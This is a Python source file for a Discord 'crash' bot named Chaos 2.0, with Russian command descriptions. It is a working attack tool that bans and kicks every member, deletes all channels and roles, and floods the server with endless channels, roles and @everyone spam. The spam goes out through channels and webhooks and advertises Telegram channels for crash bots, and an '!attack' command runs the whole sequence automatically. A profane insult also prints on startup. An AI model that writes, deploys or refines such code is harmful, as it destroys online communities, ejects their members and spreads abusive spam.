from discord.ext import commands
import discord
import time
import asyncio
import aiohttp
import os
import json
JKtimosha ="Форзель ебливый хуесос"
ids = []

intents = discord.Intents.default()
intents.members = True

client = commands.Bot(command_prefix='!', intents=intents)

client.remove_command('help')

@client.event
async def on_ready():
	print(JKtimosha)

@client.command()
async def helpchaos(ctx):
    embed = discord.Embed(
        title = 'Команды:',
        description = '`!ban @Участник`\nБанит определённого участника\n\n`!banall`\nЗабанить ВСЕХ участников\n\n`!kickall`\nКикнуть ВСЕХ участников\n\n`!delchannels`\nУдаляет ВСЕ каналы\n\n`!delroles`\nУдаляет ВСЕ роли\n\n`!channels`\nБесконечно создаёт новые каналы\n\n`!roles`\nБесконечно создаёт новые роли\n\n`!everyone`\nРассылка о краше во все каналы\n\n`!clear`\nОчистка чата\n\n`!rename`\nПереименовывание сервера и изменение аватарки\n\n`!spam`\nСпамит о краше в текущий канал\n\n`!send @Участник [ текст ]`\nОтправить сообщение от лица бота в лс участнику\n\n`!attack`\nАвтоматический краш сервера\n\n`!spamwebhooks`\nСоздание вебхуков на все каналы и спам в них (если на сервере более 50 каналов, эта команда не будет работать)',
        colour = discord.Colour.from_rgb(237, 47, 47)
    )

    try:
        await ctx.author.send(embed=embed)
    except:
    	await ctx.send(embed=embed)

    await ctx.message.delete()

@client.command()
async def ban(ctx, member: discord.Member):
	try:
		await ctx.guild.ban(member, reason='Краш сервера')
	except Exception as err:
		await ctx.send('Не могу забанить участника!')

	await ctx.message.delete()

@client.command()
async def banall(ctx):
	count = 0
	errs = 0
	await ctx.message.delete()
	for jktimosha in ctx.guild.members:
		if int(jktimosha.id) != int(ctx.message.author.id):
			try:
				await ctx.guild.ban(jktimosha, reason='Краш сервера')
				count +=1
			except:
				errs +=1

	try:
		await ctx.author.send(f'Забанено {count} участников. Не забанил: {errs}\n||Если забанено 0 чел, перемести роль бота повыше||')
	except:
		await ctx.send(f'Забанено {count} участников. Не забанил: {errs}\n||Если забанено 0 чел, перемести роль бота повыше||')	

@client.command()
async def kickall(ctx):
	count = 0
	errs = 0
	await ctx.message.delete()
	for jktimosha in ctx.guild.members:
		if int(jktimosha.id) != int(ctx.message.author.id):
			try:
				await ctx.guild.kick(jktimosha, reason='Краш сервера')
				count +=1
			except:
				errs +=1

	try:
		await ctx.author.send(f'Кикнуто {count} участников. Не кикнул: {errs}\n||Если кикнуто 0 чел, перемести роль бота повыше||')
	except:
		await ctx.send(f'Кикнуто {count} участников. Не кикнул: {errs}\n||Если кикнуто 0 чел, перемести роль бота повыше||')

async def kchls(ctx):
	good = 0
	bad = 0
	await ctx.message.delete()
	for channel in ctx.guild.channels:
		try:
			await channel.delete()
			good +=1
		except:
			bad +=1

	await ctx.guild.create_text_channel('chat')

	try:
		await ctx.author.send(f'Удалено {good} каналов, не удалил {bad} каналов.')
	except:
		chn = await ctx.guild.create_text_channel('chaos')
		await chn.send(f'Удалено {good} каналов, не удалил {bad} каналов.')

@client.command()
async def delchannels(ctx):
	asyncio.create_task(kchls(ctx))

async def krls(ctx):
	errs = 0
	goods = 0
	for jk in ctx.guild.roles:
		try:
			await jk.delete()
			goods +=1
		except:
			errs +=1

	try:
		await ctx.author.send(f'Удалено {goods} ролей, не удалил - {errs} ролей\n||Если удалено 0 ролей, перемести роль бота повыше||')
	except:
		await ctx.send(f'Удалено {goods} ролей, не удалил - {errs} ролей\n||Если удалено 0 ролей, перемести роль бота повыше||')

@client.command()
async def delroles(ctx):
	await ctx.message.delete()
	asyncio.create_task(krls(ctx))

@client.command()
async def channels(ctx):
	await ctx.message.delete()
	while True:
		await ctx.guild.create_text_channel('chaos-bot')
		await ctx.guild.create_voice_channel('Chaos BOT')
		await ctx.guild.create_category('Chaos BOT')

@client.command()
async def roles(ctx):
	await ctx.message.delete()
	while True:
		await ctx.guild.create_role(name='Crashed By Chaos BOT')

async def spallch(ctx):
	msg = '@everyone\nВнимание, данный сервер крашиться, с любовью - Chaos 2.0 :heart:\n@everyone\nВнимание, данный сервер крашиться, с любовью - Chaos 2.0 :heart:\n@everyone\nВнимание, данный сервер крашиться, с любовью - Chaos 2.0 :heart:\n@everyone\nВнимание, данный сервер крашиться, с любовью - Chaos 2.0 :heart:\n\nДискорд бота: https://discord.gg/3azmGWFPP5\nTelegram: https://t.me/protectcheck\nTelegram с краш ботами: https://t.me/crashbotsdiscord'
	for channel in ctx.guild.text_channels:
		try:
			await channel.send(msg)
		except:
			pass

@client.command()
async def everyone(ctx):
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))
	asyncio.create_task(spallch(ctx))

async def clrs(ctx):
	await ctx.channel.purge(limit=10000)

@client.command()
async def clear(ctx):
	asyncio.create_task(clrs(ctx))
	asyncio.create_task(clrs(ctx))
	asyncio.create_task(clrs(ctx))
	asyncio.create_task(clrs(ctx))
	asyncio.create_task(clrs(ctx))

	await ctx.send('Успешно очищены сообщения в данном канале!')

@client.command()
async def send(ctx, member: discord.Member, *, text):
	await ctx.message.delete()
	try:
		await member.send(text)
	except:
		await ctx.send(f'Не смог отправить сообщение!')

@client.command()
async def rename(ctx):
	await ctx.message.delete()
	with open('icon.PNG', 'rb') as f:
		icon = f.read()
		await ctx.guild.edit(name='__...<<CRASHED>>...__', icon=icon)

@client.command()
async def spam(ctx):
	await ctx.message.delete()
	for i in range(100):
		await ctx.send(f'@everyone\nВнимание, данный сервер крашиться, с любовью - Chaos 2.0 :heart: \nДискорд бота: https://discord.gg/3azmGWFPP5\nTelegram: https://t.me/protectcheck\nTelegram с краш ботами: https://t.me/crashbotsdiscord')

async def crchrls(ctx):
	for i in range(15):
		await ctx.guild.create_text_channel('chaos-bot')
		await ctx.guild.create_voice_channel('Chaos BOT')
		await ctx.guild.create_role(name='Crashed By Chaos BOT')

async def kroles(ctx):
	for jk in ctx.guild.roles:
		try:
			await jk.delete()
		except:
			pass

@client.command()
async def attack(ctx):
	goodchannels = 0
	badchannels = 0
	goodroles = 0
	badroles = 0
	banned = 0
	badbanned = 0
	
	await ctx.message.delete()
	with open('icon.PNG', 'rb') as f:
		icon = f.read()
		await ctx.guild.edit(name='__...<<CRASHED>>...__', icon=icon)

	asyncio.create_task(krls(ctx))

	good = 0
	bad = 0
	for channel in ctx.guild.channels:
		try:
			await channel.delete()
			good +=1
		except:
			bad +=1

	await ctx.guild.create_text_channel('chat')

	try:
		await ctx.author.send(f'Удалено {good} каналов, не удалил {bad} каналов.')
	except:
		pass

	asyncio.create_task(crchrls(ctx))
	asyncio.create_task(crchrls(ctx))
	asyncio.create_task(crchrls(ctx))
	asyncio.create_task(crchrls(ctx))
	asyncio.create_task(crchrls(ctx))

	count = 0
	errs = 0
	for jktimosha in ctx.guild.members:
		if int(jktimosha.id) != int(ctx.message.author.id):
			try:
				await ctx.guild.ban(jktimosha, reason='Краш сервера')
				count +=1
			except:
				errs +=1

	try:
		await ctx.author.send(f'Забанено {count} участников. Не забанил: {errs}\n||Если забанено 0 чел, перемести роль бота повыше||')
	except:
		pass

@client.event
async def on_guild_channel_create(channel):
  try:
      await channel.send(f'@everyone\nДанный сервер крашиться, с любовью - Chaos 2.0 :heart:\nДискорд бота: https://discord.gg/3azmGWFPP5\nTelegram: https://t.me/protectcheck\nTelegram с краш ботами: https://t.me/crashbotsdiscord')
  except:
      pass

async def createhooks(ctx):
  for channel in ctx.guild.text_channels: 
    try:
      await channel.create_webhook(name='Chaos 2.0')
    except:
      pass

async def spamhooks(ctx):
  for i in range(10):
    for channel in ctx.guild.channels:
      try:
        h = await channel.webhooks()
        for f in h:
          await f.send(content='@everyone\nДанный сервер крашиться, с любовью - Chaos 2.0 :heart:\nДискорд бота: https://discord.gg/3azmGWFPP5\nTelegram: https://t.me/protectcheck\nTelegram с краш ботами: https://t.me/crashbotsdiscord', wait=True)
      except:
        continue

@client.command()
async def spamwebhooks(ctx):
	await createhooks(ctx)
	asyncio.create_task(spamhooks(ctx))
	asyncio.create_task(spamhooks(ctx))
	asyncio.create_task(spamhooks(ctx))
	asyncio.create_task(spamhooks(ctx))
	asyncio.create_task(spamhooks(ctx))

client.run("token", bot =True)